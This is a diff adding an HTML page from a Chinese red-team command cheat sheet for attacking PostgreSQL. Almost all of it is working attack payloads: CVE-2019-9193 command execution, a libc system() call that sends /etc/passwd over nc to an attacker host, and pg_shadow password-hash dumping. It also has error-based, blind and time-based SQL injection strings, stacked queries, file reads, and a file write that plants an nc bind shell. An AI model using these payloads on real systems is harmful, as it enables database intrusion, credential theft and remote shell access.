@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!--
+    The page_title contains the title for a page as shown in the navigation.
+    Site name contains the name as defined in the mkdocs.yml
+  -->
+  <title>postgresql - 红队命令速查</title>
+
+  <!-- Page description -->
+  
+
+  <!-- Redirect -->
+  
+
+  <!-- Page author -->
+  
+  <!--
+    Just add a favicon.ico image to the docs.
+  -->
+  <link rel="shortcut icon" href="../../img/favicon.ico">
+
+  <link rel="stylesheet" href="../../css/colors.css">
+  <link rel="stylesheet" href="../../css/bundle.css">
+  <link rel="stylesheet" href="../../css/theme.css">
+  <link media="print" onload="this.media='all'" rel="stylesheet" href="../../css/atom-dark-one.min.css">
+  <!--
+    extra_ess contains paths to CSS files in the users
+    documentation directory or a list of CSS files defined in
+    their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_css
+  -->
+  
+
+  
+  
+
+  <!--
+    Include Google Analytics tracking code.
+
+    http://www.mkdocs.org/user-guide/configuration/#google_analytics
+  -->
+  
+
+</head>
+
+<body>
+<input id="dark-mode" type="checkbox" />
+<!--
+  The JS has to be loaded here for maximum performance, right after the #dark-mode
+-->
+<script src="../../js/theme.js"></script>
+<div class="app-body">
+  <!-- KPN STYLE Beginning -->
+  <div class="app-layout ">
+    <!-- Top Bar -->
+    <nav class="app-layout__top-bar top-bar">
+      <a class="top-bar__logo" href="https://forum.ywhack.com/command/">
+        <img alt="KPN Logo" src="../../img/logo.svg" />
+      </a>
+      <div class="top-bar__title">红队命令速查</div>
+      <ul class="top-bar__menu">
+        <!--
+          Create a search form that sends the user to the search.html file - this is
+          the other file in the template which adds search to the theme. The only
+          requirement here is that there is a text input with the name 'q' and the
+          action and methods match below.
+        -->
+          <li class="top-bar__item">
+
+            <span role="search" id="search-input-wrapper">
+              <form action="../../search.html" method="get">
+                <input type="text" class="input" id="search-input" name="q" placeholder="Search..." />
+              </form>
+            </span >
+          </li>
+        <!--
+          Versioning support
+        -->
+        
+        <!--
+          Support repo URL
+        -->
+        <li class="top-bar__item">
+          
+        </li>
+
+        <li class="top-bar__item">
+            <label class="top-bar__link" id="label-dark-mode" for="dark-mode" title="Dark mode">
+              <svg alt="dark mode" width="24" height="24">
+                <image xlink:href="../../img/ui-bulb.svg" width="24" height="24"/>
+            </svg>
+            </label>
+        </li>
+        <li class="top-bar__item top-bar__item--trigger"></li>
+
+        <!-- <li class="top-bar__item">
+
+          <a class="top-bar__link top-bar__link--active">Home</a>
+        </li>
+        <li class="top-bar__item"><a class="top-bar__link">Information</a></li>
+        <li class="top-bar__item">
+          <a class="top-bar__link top-bar__link--collapsed">Getting Started</a>
+
+        </li>
+        <li class="top-bar__item top-bar__item--trigger">Menu</li> -->
+      </ul>
+    </nav>
+
+    <!--
+      Create the navigation for the documentation.
+
+      Because we don't know how many levels deep the navigation is, it needs to
+      be included in it's own file so it can be recursive. Otherwise the theme
+      can also only support a specific number of levels.
+
+      See the nav.html file for more details about how this works.
+    -->
+    <nav class="app-layout__side-bar side-bar">
+      <div class="side-bar__action-bar">
+        <a class="side-bar__link" href="/">红队命令速查</a>
+        <!--
+          Versioning support
+        -->
+        
+        <button class="side-bar__close"></button>
+      </div>
+      <ul class="side-bar__menu">
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../.." class="side-bar__link ">
+    介绍
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../../Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
+    Linux 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+<li>
+  <a href="../../Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/" class="side-bar__link ">
+    Windows 命令速查
+  </a>
+</li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded">
+      工具使用命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../../%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/mimikatz/" class="side-bar__link ">
+    mimikatz
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+          <!--
+
+-->
+
+  <li>
+    <span class="side-bar__link side-bar__link--expanded side-bar__link--active">
+      数据库命令速查
+    </span>
+    <ul class="side-bar__sub-menu side-bar__sub-menu--visible">
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../Oracle/" class="side-bar__link ">
+    oracle
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="../mysql/" class="side-bar__link ">
+    mysql
+  </a>
+</li>
+
+
+        
+            <!--
+
+-->
+
+<li>
+  <a href="./" class="side-bar__link side-bar__link--active">
+    postgresql
+  </a>
+</li>
+
+
+        
+    </ul>
+  </li>
+
+
+        
+      </ul>
+    </nav>
+
+    <!-- MAIN BLOCK -->
+    <main class="app-layout__main main">
+      <div class="app-layout__title-bar title-bar">
+        <div class="title-bar__title" style="font-size: 12px;">postgresql</div>
+      </div>
+      
+      <div class="sidebar--secondary hidden-s hidden-xs">
+        <h4>Table of contents</h4>
+        <ul>
+        
+          
+            
+                <li><a class="a" href="#postgresql_1">PostgreSQL 命令执行</a></li>
+                
+                    <li class="child-li"><a class="a child" href="#cve-20199193">CVE-2019–9193</a></li>
+                
+            
+                <li><a class="a" href="#libcso6">使用 libc.so.6</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_2">PostgreSQL 注释</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_3">PostgreSQL 链注入点符号</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_4">PostgreSQL 版本</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_5">PostgreSQL 当前用户</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_6">PostgreSQL 用户列表</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_7">PostgreSQL 密码哈希列表</a></li>
+                
+            
+                <li><a class="a" href="#_1">查询数据库管理员账户列表</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_8">PostgreSQL 权限列表</a></li>
+                
+            
+                <li><a class="a" href="#_2">查询当前用户是否为超级用户</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_9">PostgreSQL 数据库名称</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_10">PostgreSQL 数据库列表</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_11">PostgreSQL 表格列表</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_12">PostgreSQL 列表列</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_13">PostgreSQL 报错注入</a></li>
+                
+            
+                <li><a class="a" href="#postgresql-xml">PostgreSQL XML 帮助器</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_14">PostgreSQL 盲注</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_15">PostgreSQL 时间盲注</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_16">PostgreSQL 堆叠查询</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_17">PostgreSQL 文件读取</a></li>
+                
+            
+                <li><a class="a" href="#postgresql_18">PostgreSQL 文件写入</a></li>
+                
+            
+                <li><a class="a" href="#_3">绕过过滤器</a></li>
+                
+            
+          
+        
+        </ul>
+      </div>
+      
+      <div class="container content-block">
+        <div class="kpn-style">
+          <div class="card">
+            <div class="card__body">
+
+              
+              <h1 id="postgresql">postgresql</h1>
+<h2 id="postgresql_1">PostgreSQL 命令执行</h2>
+<h3 id="cve-20199193">CVE-2019–9193</h3>
+<pre><code>DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+</code></pre>
+<h2 id="libcso6">使用 libc.so.6</h2>
+<pre><code>CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
+SELECT system('cat /etc/passwd | nc &lt;attacker IP&gt; &lt;attacker port&gt;');
+</code></pre>
+<h2 id="postgresql_2">PostgreSQL 注释</h2>
+<pre><code>--
+/**/
+</code></pre>
+<h2 id="postgresql_3">PostgreSQL 链注入点符号</h2>
+<pre><code>; #用于终止 SQL 命令。在语句中唯一可使用的位置是在字符串常量或引用标识符中。
+|| #或语句
+
+# 使用示例: 
+/?whatever=1;(select 1 from pg_sleep(5))
+/?whatever=1||(select 1 from pg_sleep(5))
+</code></pre>
+<h2 id="postgresql_4">PostgreSQL 版本</h2>
+<pre><code>SELECT version()
+</code></pre>
+<h2 id="postgresql_5">PostgreSQL 当前用户</h2>
+<pre><code>SELECT user;
+SELECT current_user;
+SELECT session_user;
+SELECT usename FROM pg_user;
+SELECT getpgusername();
+</code></pre>
+<h2 id="postgresql_6">PostgreSQL 用户列表</h2>
+<pre><code>SELECT usename FROM pg_user
+</code></pre>
+<h2 id="postgresql_7">PostgreSQL 密码哈希列表</h2>
+<pre><code>SELECT usename, passwd FROM pg_shadow 
+</code></pre>
+<h2 id="_1">查询数据库管理员账户列表</h2>
+<pre><code>SELECT usename FROM pg_user WHERE usesuper IS TRUE
+</code></pre>
+<h2 id="postgresql_8">PostgreSQL 权限列表</h2>
+<pre><code>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
+</code></pre>
+<h2 id="_2">查询当前用户是否为超级用户</h2>
+<pre><code>SHOW is_superuser; 
+SELECT current_setting('is_superuser');
+SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
+</code></pre>
+<h2 id="postgresql_9">PostgreSQL 数据库名称</h2>
+<pre><code>SELECT current_database()
+</code></pre>
+<h2 id="postgresql_10">PostgreSQL 数据库列表</h2>
+<pre><code>SELECT datname FROM pg_database
+</code></pre>
+<h2 id="postgresql_11">PostgreSQL 表格列表</h2>
+<pre><code>SELECT table_name FROM information_schema.tables
+</code></pre>
+<h2 id="postgresql_12">PostgreSQL 列表列</h2>
+<pre><code>SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
+</code></pre>
+<h2 id="postgresql_13">PostgreSQL 报错注入</h2>
+<pre><code>,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
+,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
+,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
+,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
+
+' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
+' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
+</code></pre>
+<h2 id="postgresql-xml">PostgreSQL XML 帮助器</h2>
+<pre><code>select query_to_xml('select * from pg_user',true,true,''); -- 返回所有结果作为单个 xml 行
+select database_to_xml(true,true,''); -- 将当前数据库转储为 XML
+select database_to_xmlschema(true,true,''); -- 将当前数据库转储为 XML 架构
+</code></pre>
+<h2 id="postgresql_14">PostgreSQL 盲注</h2>
+<pre><code>' and substr(version(),1,10) = 'PostgreSQL' and '1' -&gt; OK
+' and substr(version(),1,10) = 'PostgreXXX' and '1' -&gt; KO
+</code></pre>
+<h2 id="postgresql_15">PostgreSQL 时间盲注</h2>
+<pre><code>select 1 from pg_sleep(5)
+;(select 1 from pg_sleep(5))
+||(select 1 from pg_sleep(5))
+
+select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
+select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
+
+AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
+AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
+</code></pre>
+<h2 id="postgresql_16">PostgreSQL 堆叠查询</h2>
+<pre><code>http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
+</code></pre>
+<h2 id="postgresql_17">PostgreSQL 文件读取</h2>
+<pre><code>select pg_ls_dir('./');
+select pg_read_file('PG_VERSION', 0, 200);
+</code></pre>
+<h2 id="postgresql_18">PostgreSQL 文件写入</h2>
+<pre><code>CREATE TABLE pentestlab (t TEXT);
+INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
+SELECT * FROM pentestlab;
+COPY pentestlab(t) TO '/tmp/pentestlab';
+</code></pre>
+<h2 id="_3">绕过过滤器</h2>
+<p>引号</p>
+<p>使用 CHR</p>
+<pre><code>SELECT CHR(65)||CHR(66)||CHR(67);
+</code></pre>
+<p>使用 $ 符号（适用于 PostgreSQL 8及以上版本）</p>
+<pre><code>SELECT $$This is a string$$
+SELECT $TAG$This is another string$TAG$
+</code></pre>
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="footer__body">
+        
+        <div class="row">
+          <div class="col col--s-4 col--m-3 col--l-2">
+          </div>
+          <div class="col col--s-4 col--m space-between">
+            
+              <a class="footer__link padding-top-0 navigation-prev"
+                href="../mysql/"
+                title="mysql">
+                &#8592; Previous Page
+              </a>
+            
+            
+            
+                Next Page &#8594;
+            
+          </div>
+          <div class="col col--s-4 col--m-3 ">
+          </div>
+        </div>
+        
+      </div>
+    </footer>
+  </div>
+
+
+  <!--
+  MkDocs version      : 1.5.3
+  Docs Build Date UTC : 2024-07-09 15:06:35.707325+00:00
+  -->
+
+  <!--
+    To include static assets from our theme, just add
+    ../.. beforehand which will be the relative path to
+    the root of the documentation.
+  -->
+  <script src="../../js/highlight.min.js"></script>
+  <script src="../../js/languages/groovy.min.js"></script>
+  <script src="../../js/languages/asciidoc.min.js"></script>
+  <script src="../../js/languages/nix.min.js"></script>
+
+  <script>
+    hljs.highlightAll();
+  </script>
+  <script async src="../../js/detail.js"></script>
+  <!--
+    extra_javascript contains paths to JavaScript files in the
+    users documentation directory or a list of JavaScript files
+    defined in their mkdocs.yml.
+
+    http://www.mkdocs.org/user-guide/configuration/#extra_javascript
+  -->
+  
+    <script src="../../search/main.js"></script>
+  
+
+
+  <script>
+  function getMermaidTheme() {
+    if (document.getElementById("dark-mode").checked) {
+      return 'dark'
+    }
+    return 'forest'
+  }
+
+  function initMermaid() {
+    mermaid.initialize({
+      theme: getMermaidTheme(),
+      logLevel: 1,
+    });
+  }
+  var mermaidClass = document.getElementsByClassName('mermaid');
+  if (mermaidClass.length > 0) {
+
+    var mermaidScript = document.createElement('script');
+    mermaidScript.setAttribute("src", "../../js/mermaid.min.js");
+    mermaidScript.setAttribute("async", "false");
+    mermaidScript.setAttribute("type", "text/javascript");
+    mermaidScript.onload = initMermaid;
+    document.body.appendChild(mermaidScript)
+
+  }
+  </script>
+
+</div>
+</body>
+</html>
